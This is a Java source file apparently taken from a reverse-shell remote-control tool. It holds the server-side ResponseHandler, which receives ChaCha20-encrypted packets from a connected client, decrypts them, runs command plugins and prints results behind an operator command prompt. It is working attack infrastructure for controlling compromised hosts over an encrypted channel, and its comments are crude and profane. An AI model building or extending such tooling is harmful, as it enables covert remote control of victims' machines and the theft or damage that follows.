package obs1d1anc1ph3r.reverseshell.server;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.server.encryption.ChaCha20;
import obs1d1anc1ph3r.reverseshell.server.plugins.CommandPlugin;
import obs1d1anc1ph3r.reverseshell.server.plugins.PluginManager;

public class ResponseHandler implements Runnable {

	private final DataInputStream dataIn;
	private final DataOutputStream dataOut;
	private final Socket clientSocket;
	private final byte[] encryptionKey;
	private final PluginManager pluginManager;

	//I've refactored it like a good little programmer, maybe someone will be proud of me now
	public ResponseHandler(DataInputStream dataIn, DataOutputStream dataOut, Socket clientSocket, byte[] encryptionKey) {
		this.dataIn = dataIn;
		this.dataOut = dataOut;
		this.clientSocket = clientSocket;
		this.encryptionKey = encryptionKey;
		this.pluginManager = new PluginManager();
	}

	@Override
	public void run() {
		try {
			while (true) {
				int length = dataIn.readInt(); //Get the packet length
				if (length <= 12) {
					System.err.println("[ERROR] Invalid packet length: " + length); //Fuck your packet length
					break;
				}
				byte[] receivedNonce = new byte[12]; //Stupid hat
				dataIn.readFully(receivedNonce); //I just searched it up, I was thinking of dunce, nonce is a pedofile, I was wayyyyyy off

				byte[] encryptedData = new byte[length - 12];
				dataIn.readFully(encryptedData); //Read the data

				byte[] decryptedData = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedData); //Decrypt the data
				String response = new String(decryptedData); //Get the response from the decrypted data

				CommandPlugin plugin = pluginManager.getPlugin(response);
				if (plugin != null) {
					plugin.execute(dataIn, dataOut, encryptionKey, clientSocket);
				} else {
					processResponse(response); //Normal responses
				}
			}
		} catch (IOException e) {
			if (e instanceof java.net.SocketException) {
				System.err.println("[ERROR] Connection closed by client: " + e.getMessage());
			} else {
				System.err.println("[ERROR] Error reading response: " + e.getMessage());
			}
		} catch (Exception ex) {
			Logger.getLogger(ResponseHandler.class.getName()).log(Level.SEVERE, null, ex);
		} finally {
			closeResources();
			System.out.println("[*] ResponseHandler thread exiting.");
		}
	}

	private void processResponse(String response) { //Normal thing
		String[] lines = response.split("\\R");
		for (String line : lines) {
			System.out.println(line);
		}
		System.out.print("[-] Command> "); //I'm dumb and couldn't figure this out, so I put it here
	}

	private void closeResources() {
		try {
			if (dataIn != null) {
				dataIn.close();
			}
			if (dataOut != null) {
				dataOut.close();
			}
			if (clientSocket != null && !clientSocket.isClosed()) {
				clientSocket.close();
			}
		} catch (IOException e) {
			System.err.println("[ERROR] Error closing resources: " + e.getMessage());
		}
	}
}
